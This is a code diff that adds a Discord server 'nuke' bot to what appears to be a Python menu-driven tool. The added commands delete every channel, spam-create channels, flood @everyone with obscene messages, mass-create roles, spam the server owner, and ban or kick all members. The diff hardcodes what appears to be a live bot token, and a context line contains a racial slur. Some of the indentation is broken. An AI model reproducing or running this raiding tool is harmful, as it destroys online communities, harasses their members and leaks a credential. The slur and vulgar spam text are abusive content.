@@ -278,3 +278,83 @@ try:
 except KeyboardInterrupt:
   print("")
   print("bhai negr >:3")
+
+
+elif choice == 8:
+  import discord
+  from discord.ext import commands
+  from colorama import Fore
+
+  TOKEN = "MTE0Mjc0ODg4NTg0NTAyODg4NA.GJnok3.44CHkKNHCdTPNbDwan3datqtZDKkRPalZ4YIYY"
+
+  client = commands.Bot(command_prefix="robux!", intents=discord.Intents.all())
+
+
+  @client.event
+    async def on_ready():
+      print("Logged in as {}".format(client.user))
+
+
+  @client.command()
+    async def nuke(ctx):
+      await ctx.message.delete()
+      await ctx.guild.edit(name="nuked by scaigs :skull:")
+      try:
+        for channels in ctx.guild.channels:
+          await channels.delete()
+          print("deleted {}".format(channels))
+      except:
+        print("Cant delete {}".format(channels))
+
+      while True:
+        await ctx.guild.create_text_channel("no bitches")
+
+
+  @client.event
+    async def on_guild_channel_create(channel):
+      while True:
+        await channel.send("@everyone suck my dick @here")
+
+
+  @client.command()
+    async def rolespam(ctx):
+      await ctx.message.delete()
+      for i in range(100):
+        await ctx.guild.create_role(name="oops!")
+
+
+  @client.command()
+    async def ownerspam(ctx):
+      owner = ctx.guild.owner
+      while True:
+        await owner.send("@everyone no bitches??? @here")
+
+
+  @client.command()
+    async def guildname(ctx, *, newname):
+      await ctx.message.delete()
+      await ctx.guild.edit(name=newname)
+
+
+  @client.command()
+    async def massban(ctx):
+      try:
+        for members in ctx.guild.members:
+          await members.ban(reason="skill issue, no bitches")
+          print(Fore.GREEN + f"banned {members}")
+      except:
+        print(Fore.RED + f"cant ban {members}")
+
+
+    @client.command()
+    async def kickall(ctx):
+      try:
+        for members in ctx.guild.members:
+          await members.kick(reason="skill issue, no bitches")
+          print(Fore.GREEN + f"kicked {members}")
+      except:
+        print(Fore.RED + f"cant kick {members}")
+
+
+    client.run(TOKEN)
+
